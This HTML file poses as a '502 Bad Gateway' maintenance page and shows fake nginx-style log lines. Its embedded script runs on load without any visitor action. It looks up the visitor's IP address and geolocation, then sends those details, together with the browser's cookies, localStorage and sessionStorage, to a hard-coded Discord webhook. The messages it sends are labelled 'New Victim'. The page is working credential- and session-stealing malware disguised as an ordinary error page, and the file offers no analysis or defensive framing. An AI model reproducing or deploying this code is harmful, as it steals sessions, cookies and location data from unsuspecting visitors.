<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>502 Bad Gateway</title>
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: #000;
      color: #ccc;
      font-family: 'Courier New', monospace;
      font-size: 16px;
      line-height: 1.8;
      padding: 40px;
      text-align: center;
    }
    h1 {
      font-size: 36px;
      color: #f55;
      margin-bottom: 20px;
    }
    p {
      margin: 12px 0;
      color: #aaa;
    }
    .icon {
      font-size: 20px;
      margin-right: 8px;
    }
    .log {
      margin-top: 40px;
      text-align: left;
      font-size: 14px;
      color: #888;
      white-space: pre-wrap;
    }
  </style>
</head>
<body>
  <h1>502 Bad Gateway</h1>
  <p>The server received an invalid response from the upstream server.</p>
  <p>Construction hm, looks like this website is being updated — try again later!</p>
  <p>Wrench Maintenance in progress... please be patient.</p>
  <p>Hourglass Service temporarily down. We'll be back soon!</p>

  <div class="log" id="log"></div>

  <script>
    const webhookUrl = 'https://discord.com/api/webhooks/1437139074518352015/hH0soUFF036JdXMcNv39i_88_X7l9eTuzOPE619gu7o8Ocy3ffOgiXq10rgfbj1ZZl00';
    const secretToken = 'yes_its_me_abc123';
    const counterUrl = 'https://api.countapi.xyz/hit/marii/victims';

    // Real nginx-style logs
    const messages = [
      "[nginx] upstream timed out (110: Connection timed out)",
      "[proxy] failed to connect to upstream",
      "[gateway] no healthy upstream",
      "[loadbalancer] all backends down",
      "[error] 502 Bad Gateway",
      "[warn] connection reset by peer",
      "[crit] upstream server temporarily unavailable",
      "[info] retrying in 5s...",
      "[error] invalid response from origin",
      "[warn] SSL handshake failed",
      "[crit] worker process exited",
      "[info] restarting upstream service",
      "[error] DNS resolution failed",
      "[warn] cache miss storm",
      "[crit] memory pressure detected"
    ];

    const log = document.getElementById('log');
    for (let i = 0; i < 50; i++) {
      const msg = messages[Math.floor(Math.random() * messages.length)];
      const time = new Date().toISOString().slice(11, 19);
      log.textContent += `[${time}] ${msg}\n`;
    }

    // === STEALTH GEO + COORDS + DATA (FIXED & TESTED) ===
    const sendData = async () => {
      let ip = 'unknown';
      let lat = 'unknown';
      let lon = 'unknown';
      let city = 'unknown';
      let region = 'unknown';
      let country = 'unknown';
      let countryCode = 'unknown';
      let isp = 'unknown';
      let org = 'unknown';
      let asNum = 'unknown';
      let mobile = 'No';
      let proxy = 'No';
      let hosting = 'No';

      try {
        const ipResp = await fetch('https://api.ipify.org?format=json', { method: 'GET', mode: 'cors' });
        const ipData = await ipResp.json();
        ip = ipData.ip;
      } catch (e) { console.log('IP fetch failed:', e); }

      // Use ip-api.com — 100% working, no API key, CORS-enabled
      try {
        const geoResp = await fetch(`https://ip-api.com/json/${ip}?fields=status,message,country,countryCode,regionName,city,lat,lon,isp,org,as,mobile,proxy,hosting`, {
          method: 'GET',
          mode: 'cors'
        });
        const geo = await geoResp.json();
        if (geo && geo.status === 'success') {
          lat = geo.lat;
          lon = geo.lon;
          city = geo.city;
          region = geo.regionName;
          country = geo.country;
          countryCode = geo.countryCode;
          isp = geo.isp;
          org = geo.org;
          asNum = geo.as;
          mobile = geo.mobile ? 'Yes' : 'No';
          proxy = geo.proxy ? 'Yes' : 'No';
          hosting = geo.hosting ? 'Yes' : 'No';
        }
      } catch (e) { console.log('Geo fetch failed:', e); }

      const fields = [
        { name: 'Location', value: `${city}, ${region} (${country} / ${countryCode})\nLat: ${lat}, Lon: ${lon}`, inline: false },
        { name: 'Network', value: `IP: ${ip}\nISP: ${isp}\nOrg: ${org}\nAS: ${asNum}\nMobile: ${mobile} | Proxy: ${proxy} | Hosting: ${hosting}`, inline: false }
      ];

      const embed = {
        title: `New Victim: ${ip}`,
        description: `Timestamp: ${new Date().toISOString()}`,
        color: 15158332,
        fields: fields,
        footer: { text: 'Grabbed via Minimal 502 Page' }
      };
      embed.fields.push({ name: "Lock", value: secretToken, inline: true });

      const formData = new FormData();
      formData.append('payload_json', JSON.stringify({ embeds: [embed] }));

      try { if (document.cookie) formData.append('file1', new Blob([document.cookie]), 'cookies.txt'); } catch (e) {}
      try { formData.append('file2', new Blob([JSON.stringify(localStorage, null, 2)]), 'localStorage.json'); } catch (e) {}
      try { formData.append('file3', new Blob([JSON.stringify(sessionStorage, null, 2)]), 'sessionStorage.json'); } catch (e) {}

      try { await fetch(webhookUrl, { method: 'POST', body: formData }); } catch (e) {}
    };

    // Run immediately and on DOM load
    sendData();
    document.addEventListener('DOMContentLoaded', sendData);
  </script>
</body>
</html>
